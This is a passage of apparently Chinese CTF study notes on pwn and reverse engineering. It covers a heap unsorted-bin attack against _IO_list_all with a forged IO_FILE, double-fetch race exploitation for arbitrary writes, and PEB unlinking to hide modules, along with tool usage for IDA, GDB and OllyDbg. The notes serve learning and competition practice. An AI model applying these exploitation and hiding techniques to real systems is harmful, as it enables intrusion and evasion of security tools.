0x61 ，且 bk 字段指向 _IO_list_all - 0x10，同时在 chunk 中伪造 IO_FILE结构体 申请一个大小不等于 0x60 的 chunk，首先循环在 unsorted bin 寻找，由于 bk 被修改，不满足bck == unsorted_chunks(av)，不会从该 chunk 切下合适 chunk 返回 while ((victim = unsorted_chunks(av)-\u003ebk) != unsorted_chunks(av)) { bck = victim-\u003ebk; // victim的前一个chunk ...; size = chunksize(victim); // 获取chunk大小 // 需要切割情况 if (in_smallbin_range(nb) \u0026\u0026 // 申请大小在small bin范围 bck == unsorted_chunks(av) \u0026\u0026 // unsorted bin中只有一个chunk victim victim == av-\u003elast_remainder \u0026\u0026 // victim刚好是last_remainder (unsigned long)(size) \u003e (unsigned long)(nb + MINSIZE)) // victim大小 \u003e 申请大小 + 0x20 { 将该 chunk 从 unsorted bin 中取出，完成 unsorted bin attack 将 fd 中的_IO_list_all指针值改为unsorted_chunks(av) 并将其放入 small bin 中，接着进入 unsorted bin 第二次循环，此时 victim 为 _IO_list_all - 0x10，因此不会通过对victim-\u003esize检查，进入malloc_printferr函数 while ((victim = unsorted_chunks(av)-\u003ebk) != unsorted_chunks(av)) { bck = victim-\u003ebk; // victim的前一个chunk if (__builtin_expect(victim-\u003esize \u003c= 2 * SIZE_SZ, 0) || __builtin_expect(victim-\u003esize \u003e av-\u003esystem_mem, 0)) // 若小于0x10或大于arena管理的最大内存，报错 malloc_printerr(c","date":"2024-10-09","objectID":"/pwn_note/:18:5","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"条件竞争 ","date":"2024-10-09","objectID":"/pwn_note/:19:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Double Fetch 漏洞点 第一次文件读到内存中判断 count 大小，而进入 else 后又执行了读文件到内存，此时不判断 count 大小 // 内存中logcount紧挨guest名字后 file_content_2_memory(a); // 读取本地文件内容到内存中 if ( *(a + 64) \u003e 4 ){ // a+64存储logcount exit(1); } else{ file_content_2_memory(a); read(0, (void *)(8 * (*(__int16 *)(a + 64) + 2LL) + a + 8), 8uLL); // 向第logcount偏移的位置读入guest的名字 ++*(a + 64); memory_2_file(a); // 将内存中数据写入本地文件中 } 利用： 第 1 个进程准备第五次写入而到达代码第 6 行时，开启第 2 和第 3 个进程绕过 2-3 行的判断到达第 6 行，第 1 个进程输入第五个值后退出 第 2 个进程写入值将覆盖 logcount，达成任意写，第 3 个进程写入值将通过 read 修改 memory[logcount]内容达成任意地址写 ","date":"2024-10-09","objectID":"/pwn_note/:19:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"musl pwn ","date":"2024-10-09","objectID":"/pwn_note/:20:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"环境 下载安装包，源码 sudo dpkg -i musl_1.1.xx-x_amd64.deb # 同样适用于Libc调试符号musl-dbgsymxxx.ddeb # https://launchpad.net/ubuntu/ sudo apt-get install -y musl musl-dev # 使用patchelf将可执行文件ld更改为对应ld文件:ld-musl-x86_64.so.1，否则会卡在syscall指令某处 ","date":"2024-10-09","objectID":"/pwn_note/:20:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"AWD ","date":"2024-10-09","objectID":"/pwn_note/:21:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"通防 evilPatcher python evilPatcher.py elf sandboxs/xxx.asm 1 # arg1: 想要patch的elf文件, arg2: 沙箱规则文件, 想输出更多过程在最后参数加上1 ","date":"2024-10-09","objectID":"/pwn_note/:21:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"基础知识 除了逆向外也可以尝试爆破 #include \u003cstdio.h\u003e int main(){ int cipher; for(int i=0;i\u003c0xffffffff;i++){ cipher = i; //加密异或等操作 } if (cipher==20241212153){ printf(\"flag1:%x\\n\",i); } } ","date":"2024-10-09","objectID":"/reverse_note/:1:0","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"Windows kernel32.dll：控制系统内存管理、数据输入输出、中断处理，当Windows启动时，其驻留在内存中特定的写保护区域，使别的程序无法占用该内存区域 user32.dll：用户界面相关应用程序接口，包括Windows处理、基本用户界面 gdi32.dll：Windows GDI图形用户界面相关程序，绘制图形、显示文字 句柄（handle）：唯一整数值，标志程序中不同对象和同类对象中的不同实例 反编译 线性扫描(Linear Sweep)：简单顺序扫描文件分析，均分析为代码，objdump, OllyDbg, x64dbg 递归下降(Recursive Traversal)：控制流根据call指令调用关系分析，IDA pro 约定 变数名称前缀表示类型 lp：Loing Pointer h：Handler dw：DWORD 函数名称后可能有大写字母 A：字符串参数使用ANSI W：字符串参数使用UNICODE（Wide character） EX：扩展（Extended） 调用约定 x86 32位 __cdecl：参数从右向左依次压入栈，调用完毕后，调用者caller负责清理参数，返回值位于EAX __stdcall：（Win32 API）参数从右向左压入栈，调用完毕后，被调用者负责清理参数，返回值位于EAX __thiscall：参数从右向左压入栈，类方法的this指针通过ECX传递给被调用者，若参数个数确定，则参数全部压入栈后this指针入堆栈；若参数个数不确定，调用者清理堆栈 __fastcall：函数第一个和第二个DWORD参数通过ECX和EDX传递，其他参数从右向左压入栈，被调用函数清理堆栈 清理栈帧指参数使用了栈则栈帧会发生变化，需要使用add rsp, 0x??来清理，push x次，32位下add x0x4，64位下add x0x8 x86-64 Microsoft x64：前四个参数放入RDI、RSI、RDX、RCX，（Windows下前四个参数让RCX、RDX、r8、r9）剩下参数从右到左压入栈，调用者caller负责清理堆栈 SystemV x64(SysV)：Linux与MacOS上使用，比Microsoft多两个寄存器，使用RDI、RSI、RDX、RCX、R8、R9，剩下参数从右向左压入栈中，调用者caller负责清理堆栈 局部变量：放于栈上 Eflags ZF（Zero Flag）：零标志 PF（Parity Flag）：奇偶标志 AF（Adjust Flag）：辅助标志 OF（Overflow Flag）：溢出标志 SF（Sign Flag）：符号标志 DF（Direction Flag）：方向标志 TF（Trap Flag）：追踪标志 IF（Interrupt enable Flag）：中断允许标志 Syscall Windows 的 syscall number 随版本更新会变更，一般呼叫API SEH机制 Structured Exception Handling，结构化异常处理 VC++及Windows的异常处理机制，可利用/0等方式触发异常 以链的形式存在，第一个异常处理器中若未处理相关异常，异常会传递到下个异常处理器直到得到处理 typedef struct _EXCEPTION_REGISTRATION_RECORD { PEXCEPTION_REGISTRATION_RECORD Next; // Next值为FFFFFFFF表示最后一个节点 PEXCEPTION_DISPOSITION Handler; // 当前异常处理回调函数的地址 } EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD; 线程信息块TIB（Thread Information Block or TEB） typedef struct _NT_TIB { struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; //异常的链表 PVOID StackBase; PVOID StackLimit; PVOID SubSystemTib; union { PVOID FiberData; DWORD Version; }; PVOID ArbitraryUserPointer; struct _NT_TIB *Self; } NT_TIB; 调用 // Visual C++ __try{compound-statement} __except(filter-expression){compound-statement} __try{compound-statement} __finally{compound-statement} ","date":"2024-10-09","objectID":"/reverse_note/:1:1","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"Linux file \u003csomefile\u003e # 查看文件类型 strings \u003csomething\u003e # 打印文件中可见字符串 strings -n \u003cmin-len\u003e \u003csomething\u003e # 打印最短长度为min-len的可见字符串 strings \u003csomething\u003e | grep \"xx\" objdump -M intel -d \u003cbinary\u003e # intel格式展示反汇编结果 strace # 查看 binary 执行时的 system call 和 signal ltrace # 查看 binary 执行时的 library call 可执行程序报错：linux版本可能不匹配，尝试高版本打开 ./a.elf: /lib/x86_64-linux-gnu/libstdc++.so.6: version `GLIBCXX_3.4.32' not found (required by ./a.elf) ","date":"2024-10-09","objectID":"/reverse_note/:1:2","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"数学 乘法逆元： $a\\cdot a^{-1}\\equiv 1(mod\\quad p)$ # 求 a 乘法逆元 from gmpy2 import invert inv = invert(a,p) 逆向下面公式 // a1[k] 有限域 (0x00 ~ 0xff) 即 0 ~ 255 加密 for(int j = 0; j \u003c 12; ++j) a1[j] = a1[j] * 17 + 113; // 整除 17 会损失数据, 不可 /17 // 逆向解密 求 17 在 mod 256 的乘法逆元: 241 for(int j = 0; j \u003c 12; ++j) a1[j] = (a1[j] - 113) * 241 ","date":"2024-10-09","objectID":"/reverse_note/:1:3","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"计算机组成 VA：虚拟地址 RVA：（Relative Virtual Address）相对虚拟地址，相对于镜像基址的位置，即VA = ImageBase + RVA Entry Point RVA - .text section RVA = Entry Point file offset - .text section file offset 八个比特（bit）称为一个字节（byte） 两个字节称为一个字（word）——16bits 两个字称为一个双字（dword）——32bits 两个双字称为一个四字（qword）——64bits 位运算 // 基础 优先级 not \u003e and \u003e or \u003e xor or | // 00=0 01=1 10=1 11=1 xor ^ // 00=0 01=1 10=1 11=0 a^a=0 0^a=a a^b^a=b and \u0026 // 00=0 01=0 10=0 11=1 自己与自己相与得自己 nor // 与or相反 nand // 与and相反 not // 0=1 1=0 // 位与 x \u0026 1 // 若为0:偶数, 若为1:奇数 // 负数计算 (-25 \u0026 0xff) 转换 移位 \u003c\u003c n \u003c===\u003e 乘2^n v1 = v2 | (v3 \u003c\u003c 16) // v3左移16位成为高16位 // v1 = 0xaabbccdd 则 v3 = 0xaabb, v2 = 0xccdd 数据类型大小 short：2字节 char：1字节 int：4字节 double：8字节 long：8字节 python中将负数表示为无符号32位或64位整数 unsigned_value = (negative_value + (1 \u003c\u003c 64)) \u0026 0xFFFFFFFFFFFFFFFF # 转化为64位 ","date":"2024-10-09","objectID":"/reverse_note/:1:4","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"汇编 jc ;CF==1执行\rjo ;OF==1执行\rjz ;ZF==1执行 nop为0x90 movzx ; 将源操作数值复制到目标寄存器后将高位清零得到32位\rxor edx, eax; 结果存在edx中 x86-64架构的SIMD寄存器，处理单指令多数据操作：xmm0-xmm15可以存储128位数据，IDA中显示不了xmm寄存器值 movaps xmm0, ds:xmmword_XXXX ; 将该地址128位数据移到xmm0中, xmm0中存4个32位整数\r# xmmword_XXXXX xmmword 3000000020000000100000000h\r# xmm0: [0x1, 0x2, 0x3, 0x4] movd xmm0, ecx ; 将ecx 32位整数移到xmm0中, 其余96位填充为0\rpshufd xmm1, xmm0, 0 ; 从xmm0取第0个元素复制到xmm1中，其余填充为0 # xmm1 = [0x00, 0x01, 0x02, 0x03]\r# xmm0 = [0x15151515, 0x0, 0x0, 0x0, 0x0]\rpadd xmm1, xmm0 ; 相加 ; [0x00+0x15, 0x01+0x15, 0x02+0x15, 0x03+0x15]\randps xmm1, xmm0 ; 按位与\r; [0x00\u00260x15, 0x01\u00260x15, 0x02\u00260x15, 0x03\u00260x15]\rxorps xmm1, xmm2 ; 按位异或\r; [0x00^0x15, 0x01^0x15, 0x02^0x15, 0x03^0x15] packuswd xmm1, xmm1 ; 16位无符号整数打包到一个8位无符号整数\r# xmm1 = [0x0000ffff, 0x00010001, 0x00020002, 0x00030003]\r# xmm1 = [0xffff, 0x0001, 0x0002, 0x0003] Intel mov rax, 0x80\rxor rbx, rcx\rmov rax, QWORD PTR [rbx+rcx*4] AT\u0026T mov $0x80, %rax\rxor %rcx, %rbx\rmov (%rbx, %rcx, 4), %rax struct 分配 0x18 bytes 内存空间，内存空间起始位置存在 rbp-0x8 将 rbp-0x8 的值存于 rax，即 rax 是 ms 的基址 ms-\u003ea 的偏移为 0x0，ms-\u003eb的偏移为 0x8，ms-\u003ec 的偏移为 0x10 1+8+4 = 13 bytes 实际用了 24 bytes ","date":"2024-10-09","objectID":"/reverse_note/:1:5","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"C strncmp(const char *str1, const char *str2, size_t n) // 比对str1和str2开头n个字符 strcpy(char *dest, const char *src) // 将src复制到dest memcpy(dest_addr, src_addr, bytes_num) // 从 src_addr 拷贝 bytes_num 个字节数据到 dest_addr memset(arr, 0, sizeof(arr)); // 将 arr 指针指向的内存块的sizeof(arr)所有字节指定为0 scanf(\"%s\", buf); // 存在溢出操作, 假设输入15个字节, 会自动将第16个字节设为\\0 scanf(\"%15s\", buf); // 指定输入字节 fgets(x, 32, stdin); // IDA中可能将x数组分为多个变量，实际可能均为x, 但代码显示的x实际为x[0] 文件操作 fseek(FILE *stream, long int offset, int whence)// 设置流的文件位置为给定的偏移 // 文件流, 偏移, 添加偏移量的位置(0:开头, 1:指针位置, 2:结尾) fputc(int char, FILE *stream) // 将char指定的字符写入指定的流指针处 fprintf(ILE *stream, const char *format, ...) // 格式化字符串输出到流 a = _acrt_iob_func(1i64) // 将标准输出流stdout的文件指针给a，可通过a向标准输出流写数据 fgets(char *str, int n, FILE *stream); // 从文件流读入 n-1 个字符到 str, 第 n 个为\\0 宏 LODWORD(v4) = 0 //初始化低32位为0 HIDWORD(v4) = 0 //初始化高32位为0 SHIDWORD(v4) //取高32位并作为有符号整数 数据类型：LL即long long int 其他 setlocale(int category, const char *locale); //设置或读取位置相关信息 格式化字符串 printf(\"%x\", a); // 十六进制 C逆向代码 char password_enc[] = {0x49, 0x4B}; char password[47]; for (int i = 0; i \u003c 46; i++){ password[i] = password_enc[i] ^ 0x24; } password[46] = 0; // 使用0字符来截断掉%s的无尽输出 printf(\"%s\\n\", password); 格式转换相关 char Str[48]; // 假设已输入 // strlen(const char *Str) [Str是指向数组第一个字符的指针] if ( strlen(Str) == 12 ){} // 12是指12字节, 即Str: 'abcdefghijkl' process(Src); // void process(unsigned int *a1) // 此时Str将被解析为无符号整数 \u003e 32位即4字节, 所以此时进入process后 // 'abcd'-\u003e0x61,0x62,0x63,0x64-\u003e小端存储 -\u003e0x64636261 // a[] 3个整数: [0x64636261, 0x68676665, 0x6c6b6a69] // 假设操作后 0x64636261 变为 0x68676665, 该值传回a[0]时, a[0]换为char时表示'efgh' ","date":"2024-10-09","objectID":"/reverse_note/:1:6","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"C++ 0xCC 是一种填充字节，通常用于调试表示未初始化的内存区域 Name Mangling：附加修饰函数名，用于辨识参数不同的同名函数 命令行使用c++filt \u003cname\u003e来获取原始的函数名 或gdb上使用set print asm-demangle on IDA相关 __do_global_ctors() // 编译器生成, 初始化全局和静态对象 a = 20i64 // a = 20 且 i64 指定为带符号的64位整数 std::ostream::operator\u003c\u003c(v1); // 输出 Windows API DWORD GetCurrentThreadId(void); // 获取当前线程的标识符 ","date":"2024-10-09","objectID":"/reverse_note/:1:7","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"可执行文件 PE文件 PE文件（Portable Executable）：32位【PE32】，64位【PE+或PE32+】 可执行：exe, scr 库：dll, ocx, cpl, drv 驱动程序：sys, vxd 对象文件：obj DOS头 DOS存根 向下兼容，用DOSBox执行PE会输出红色框中字符串 NT头 映射 节Sections .text：代码段 .idata：放 import tables .data：初始化数据 .bss：未初始化数据 .reloc：relocation 信息 .rsrc：资源数据 .rdata：只读数据 .tls：Thread Local Storage，线程局部存储数据 IAT (Import Address Table)，存储在 .idata section 内的表 程序载入前相当于INT，指向 IMAGE_IMPORT_BY_NAME 程序载入后存储外部引入函数的位置 EAT (Export Address Table) 应用EAT来做GetProcAddress 从 module image base 取得指定 API address 从optional header 的 DataDirectory[0] 取得EAT 遍历AddressOfNames，寻找指定API名称 透过AddressOfNameOrdinals得到ordinal 从AddressOfFunctions得到API RVA，避免直接呼叫GetProcAddress PEB （Process Environment Block） PEB断链：将特定的module隐藏（x86-64） 从 gs:[0x60] 取得 PEB 从 PEB 取得 Ldr 通过 Ldr 内的 InLoadOrderModuleList 遍历所有 LDR_DATA_TABLE_ENTRY 结构 找到指定的 LDR_DATA_TABLE_ENTRY 后，将其从三个 linked list 中删除 应用PEB来做GetModuleHandle 取得特定的 module image base(x86-64) 从 gs:[0x60] 取得 PEB 从 PEB 取得 Ldr 通过 Ldr 内的 InLoadOrderModuleList 遍历所有 LDR_DATA_TABLE_ENTRY 结构 比对 BaseDllName 得到 DllBase，避免直接呼叫 GetModuleHandle DLL （Dynamic Link Library）导出函数给程序使用 DLL的main为DllMain，载入、卸载时会执行 BOOL WINAPI DllMain( //BOOL: 返回类型 WINAPI: 调用约定 HINSTANCE hinstDLL, // 指向加载 DLL 的实例的句柄的类型 DWORD fdwReason, // 调用函数原因 LPVOID lpvReserved ) // 保留 { switch( fdwReason ) { case DLL_PROCESS_ATTACH: break;// 进程附加事件,当进程加载这个DLL时执行一次性初始化操作 case DLL_THREAD_ATTACH: break;// 线程附加事件,线程从操作系统创建并且该DLL已加载时执行初始化操作 case DLL_THREAD_DETACH: break;// 线程分离事件 case DLL_PROCESS_DETACH: if (lpvReserved != nullptr) { break;// 进程未终止，不执行清理 } break;// 清理工作 } return TRUE; // DLL_PROCESS_ATTACH成功 } EXE文件在终端运行，不要直接双击 ELF文件 readelf -S program # 查看elf文件的section readelf -a xxx # 全部显示 节： .text节：程序代码指令 .rodata节：保存只读数据，只能在text段找到.rodata节 .plt节：过程链接表(Procedure Linkage Table)，包含动态连接器调用从共享库导入的函数所需的代码 .data节：存在于data段中，保存了初始化的全局变量数据 .bss节：存于data段中，保存未进行初始化的全局数据，初始化为0，程序执行可进行赋值 .got.plt节：全局偏移表-过程链接表，.got节保存全局偏移表，.got和.plt节一起提供了对导入的共享库函数的访问入口，由动态连接器在运行时进行修改 .dynstr节：动态链接字符串表，存放了一系列字符串，空字符作为终止符 断点 软件断点：int 3|0xcc 执行触发程序异常：breakpoint_，或产生其他异常如0xce 硬件断点：调试寄存器DR0~DR3设定地址，用DR7设定状态，最多4个 读/写/执行某精准地址产生异常 内存断点：设置地址不可访问/写属性，读/写/执行该内存时产生异常，调试器判断并接管异常 改变某分页属性，与VirtualProtect函数有关 以一整个分页为单位的断点 条件断点：满足特定条件，暂停执行 ","date":"2024-10-09","objectID":"/reverse_note/:1:8","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"大小端序 字符存储为小端序，所以编写脚本计算时需要将其倒序 栈上是小端序存储的 ","date":"2024-10-09","objectID":"/reverse_note/:1:9","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"Python import itertools choices = [\"1\", \"2\"] combinations = list(itertools.product(choices, repeat=7)) # 7位, 每一位可以为 choices 中的任何一个, 生成所有可能值 [f\"{num:02x}\" for num in int_array] # 整型数组以十六进制输出, 不足用0补足 ord(): 字符 转换为对应的 ASCII 码值 chr(): ASCII 码值 转换为对应的 字符 转换 可以尝试用CyberChef转换，output中的魔法棒 binary_data = bytes.fromhex(content) # 字节字符串 \"0x89\" \"0x50\" 转换为真字节 b'\\x89' b'P' hex_data = binary_data.hex() # 真字节b'\\x89' 转换为字符串\"89\", 有时需要binary[::-1] hex_type = hex(int(binary_data.hex(), 16)) # 真字节b'\\x89' 转换为十六进制字符串'0x89' val = val.rstrip('h') hex_value = int(val, 16) # 十六进制字符 \"0xabc\" 直接转整型 2748 binary_value = format(hex_value, '08b') # 十六进制字符串 \"FFh\" \"D8h\" 转换为对应的8位二进制数 '11111111' '11011000' byte_val = char_val.encode() # 字符串'2024' 转换为字节 b'2024' 数据处理 data = '''xjowefg, feiwow ewioa, efils , fefe # 杂乱的数据''' # 清理逗号等 hex_values = [val.strip() for val in data.replace('\\n', ',').split(',')] # 每行输出10个 for i in range(0, len(hex_values), 10): print(', '.join(hex_values[i:i+10])) 类 class A: def __str__(self): # __xx__魔术内置方法，一般python解释器自动调用 return str(self) # 静态方法: 用于创建类的实例，分配内存创建对象 def __new__(cls, *args, **kwargs): return super(A, cls).__new__(cls, *args, **kwargs) @property # 方法转换为同名的只读属性 instance.aaa来访问 def aaa(self): return self.aaa A1 = package.A() map map(function, iterable) # 对iterable中的每个元素应用function pip 安装指定版本的包会将原先的包给卸载，代替为指定版本 进程subprocess import ctypes def start_suspended_process(proc_name): # 启动并挂起进程 creation_flags = 0x14 # CREATE_SUSPENDED=0x4: 子进程创建立即挂起 # CREATE_NEW_CONSOLE=0x10: 创建新的控制台窗口 process = subprocess.Popen(proc_name, creationflags=creation_flags) print(\"子进程已启动并挂起\") return process.pid def resume_process(pid): # 恢复进程 try: kernel32 = ctypes.WinDLL('kernel32', use_last_error=True) kernel32.DebugActiveProcess(pid) print(f\"进程 {pid} 已恢复.\") except OSError as e: print(f\"恢复进程时发生错误: {str(e)}\") ","date":"2024-10-09","objectID":"/reverse_note/:1:10","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"JAVA java -jar xx.jar # 运行java文件 类型 Byte: java.lang中一个类，封装byte byte: 基本数据类型，整型数据1字节 格式 public class Main { public static void main(String[] args) { xx; } } 输入输出 // 输出 System.out.println(\"hello\"); // 输入 Scanner scanner = new Scanner(System.in); String flag = scanner.next(); // 输入一行 数据转换 // 字符串 转换为 UTF-8字节 String s = \"hello\"; byte[] by = s.getBytes(StandardCharsets.UTF_8); // by[i]输出为第i+1个字符的ASCII码值 // byte 转换为 Byte Byte byte_ = Byte.valueOf(by[0]); byte_.byteValue() // 取值 异常 Exception[] exceptions = { (Exception)new BuDaoLePaoException(), (Exception)new DxIsNanTongException() }; try { xxx } catch (BuDaoLePaoException ex0) { xxx } catch (DxIsNanTongException ex1){ xxx } catch (Exception e) { throw new RuntimeException(e); } ","date":"2024-10-09","objectID":"/reverse_note/:1:11","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"寄存器 x86中寄存器：EBP、ESP、EIP、EAX、EBX、ECX、EDX、EDI、ESI x86-64中寄存器：RBP、RSP、RIP、RAX、RBX、RCX、RDX、RDI、RSI、R8~R15 ","date":"2024-10-09","objectID":"/reverse_note/:1:12","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"工具 ","date":"2024-10-09","objectID":"/reverse_note/:2:0","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"GDB 查看格式 x/nfu \u003caddr\u003e\rx: examine\rn: 个数\rf:显示方式\rx:十六进制 d:十进制 u:十进制无符号 o:八进制 t:二进制\ra:十六进制 i:地址格式 c:字符格式 f:浮点数\ru:地址单元长度\rb:单字节 h:双字节 w:四字节 g:八字节 针对汇编cmp eax, DWORD PTR [rbp-0x94]查看地址中内容 b *xxx # 通过objdump确定设置断点的地址 x/wx $rbp-0x94 # gdb中查看内容 x/sw $eax # eax中内容以字符串形式显示 命令 disassemble func # 查看函数反汇编 info registers # 查看寄存器地址 ","date":"2024-10-09","objectID":"/reverse_note/:2:1","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"IDA 取IDA数据时，小端序取，4个4个倒过来取 函数窗口：ctrl+F搜索函数 导入函数窗口：Imports窗口，导入的一些函数 添加反汇编注释：option \u003e general \u003e Display disassembly line parts \u003e Auto comments 反汇编窗口字体调整：option \u003e font 十六进制窗口编辑：F2，F2保存 函数窗口中shift+F5打开应用库模块列表，继续按insert键打开可用库模块列表，进行导入 使用d可以将数据改变大小从byte转换为2bytes-word，4bytes-dword，8bytes-qword 或者右键设置Array，改变数组显示 undefine可以将识别错误的代码取消，然后右键将字节转换为相应类型 清除指针类型用于重新定义结构体：右键 \u003e Reset pointer type db, dw, dd, dq 分别代表 1, 2, 4, 8 字节 一般直接 shift + F12 找字符串窗口，对应字符位置ctrl + x 找到函数 db 2 dup(14h)`表示 define byte定义字节，2个`14h 查看机器码：Options \u003e General \u003e opcode 应用： 变量为64位，8字节，则在栈中需要8字节空间 int v1[] = {2, 0, 2, 4}; func((__int64)v1); // 表示将v1的地址转为64位整数 *(_DWORD *)(v1 + v2) + v3; // v1数组偏移v2的地址处取一个32位整数(dword)值 与v3相加 *(_QWORD *)List // 读取 List 的前 64 位数据 (_DWORD)v4 // 取低32位 (result \u003e\u003e 32) \u0026 0xFFFFFFFF // 取高32位 (result) \u0026 0xFFFFFFFF // 取低32位 unsigned int v4; __int64 a1; *(_DWORD *)(a1 + 4i64 * (v4 \u0026 3)); // v4 \u0026 3(11) 即取低两位, 确保为 0,1,2,3, a1表示某内存区域首地址 // 4i64为一个4字节, 作为a1偏移的单位, 即a1偏移0|1|2|3个4字节的位置取一个DWORD32位 __halt(); // 暂停处理器 unsigned _int8 // 无符号8位整型 int // 32位整型 .data:0000000140022000 array db 0A3h, 69h, 96h, 26h, 0BDh, 78h, 0Bh, 3Dh, 9Dh, 0A5h .data:0000000140022000 ; DATA XREF: main_0+202↑o .data:000000014002200A db 28h, 62h, 34h dup(0) // 此处存储一般为 0x269669a3, 0x3d0b780b, 0x6228a59d 插件： Ctrl + 3：呼出插件 Findcrypt：IDA9中成功，IDA7.5, 7.7, 8.3中都不显示 edit \u003e Plugins \u003e Findcrypt：可以找到MD5, DES, CRC等 E-Decompiler：IDA7.5，对易语言进行分析插件 ida.cfg文件解除Block_CJK_Unified_Ideographs前的注释 ida.dll文件用IDA64打开，搜索[](),，将有下划线一行nop掉 if ( !v8 || !strchr(\" [](),*\u0026\", v11) ) { if ( v10 - v9 \u003c 8 || strncmp(v10 - 8, \"operator\", 8ui64) ) { LABEL_23: *v10 = '_'; // nop! 装入插件可显示中文函数及易语言反编译 Scyllahide：反反调试工具，IDA7.5，注意要明确调试代码是32位还是64位！！ 反调试报错：XXXXXXXX:unknown exception code 0 (exc.code 0, tid XXXXX) 64位调试32位程序使用Scyllahide后会报错 设置扩展参数 运行ScyllaHideIDAServerx86.exe，并开始动态调试，可绕过debug检测 快捷键： A：转换为字符串（ASCII） R：转换为char型 C：转换为代码（code） ctrl+shift+w：IDA不提供撤消，使用快照功能【file \u003e take database snapshot】 ctrl+E：函数窗口对函数进行编辑 X：查看函数的交叉引用，如何被引用 Y：修改局部变量类型 ;：汇编界面添加注释 /：伪代码界面添加注释 Ctrl + P：函数跳转 Alt + T：搜索文本字符串 Shift + F2：脚本执行窗口 F6：回到最近操作的窗口 Ctrl + x：对变量输入，可以获取哪个函数使用了这个变量 动态调试 选择Load WIndows debugger调试器，设置断点在某一代码行，需要在Debugger中打开Use source-level debugging F7: 单步步入 F8: 单步步出 F9: 直接跳到下一个断点 Ctrl + F7: 直到返回跳出函数 可以点击寄存器区的寄存器箭头前往hex程序区 想查看某变量变化：右键 \u003e Add Watch 断点 可下多个断点，F9直接跳转； 内存断点，对数据段进行断点，每次读写该区域将会提示并停止：点击数据所在地址 \u003e F2 \u003e 设置是否读写 + 设置Size(可观察数组) 远程调试(如windows调试linux下文件) IDA pro安装目录下的dbgsrv文件夹下选择调试的程序linux_server 在相应远程linux主机设置权限并执行linux_server IDA选择Remote Linux debugger，Debugger \u003e Process options，设置远程Linux IP地址 __debugbreak()：在代码中引入断点，系统会提示用户运行调试器 ","date":"2024-10-09","objectID":"/reverse_note/:2:2","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"Ghidra Symbol Tree中包含Functions, Classes等，在m中有main函数 查看函数调用关系：Window \u003e Function Call Graph 变量重命名：右键 \u003e Rename Variable，快捷键l 点亮所有变量：鼠标中键 注释：右键 \u003e Comments 改函数签名：右键 \u003e Edit Function Signature 改数字的进制：右键 ","date":"2024-10-09","objectID":"/reverse_note/:2:3","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"Frida 可用于调试hook Windows的exe可执行文件进程 pip安装出现：拒绝访问。，以管理员身份运行 pip install frida==16.4.10 # 16.5.1 win10报错不支持, win11可以 pip install frida-tools ","date":"2024-10-09","objectID":"/reverse_note/:2:4","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"DIE （Detect It Easy）查壳工具 ","date":"2024-10-09","objectID":"/reverse_note/:2:5","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"Exeinfo PE 查壳工具 ","date":"2024-10-09","objectID":"/reverse_note/:2:6","tags":["reverse"],"title":"REVERSE","uri":"/reverse_note/"},{"categories":["Notes","CTF"],"content":"OllyDbg 只适用32位，不再更新 F2：下断点 F4：运行到光标位置 F7：单步步入 F8：单步步过 F9：运行，到断点处 F12：暂停运行程序 重新开始：x图标 + \u003c\u003c图标 插件 \u003e 中文搜索引擎 \u003e 搜索 ASCII：找字符串 查看函数调用：右键 \u003e 查看调用树 双击代码和注释都可直接进行修改 查找数据并修改：数据窗口 \u003e Alt + M打开Memory map \u003e Ctrl + B进行搜索 \u003e 右键可以修改，需要进行保存【右键复制到可执行文件】 \u003e 保存文件 跳出循环：右键 \u003e 断点 \u003e 运行到选定位置 工具栏窗口： 1.日志窗口(L) 2.模块窗口(E):查看每个模块的内存基址 3.内存窗口(M):查看每一个模块的段,所占用的内存区域 4.线程窗口(T):线程信息 5.窗口(W):查看程序的窗口句柄,窗口名,风格样式,回调函数等信息 6.句柄(H) 7.反汇编窗口( C) 8.补丁窗口(/) 9:堆栈窗口(K):可查看调用堆栈,调试时堆栈回溯：右键 \u003e 显示调用 10.断点窗口(B):显示所有的F2断点 11.参考( R) 12.run跟踪窗口(…) 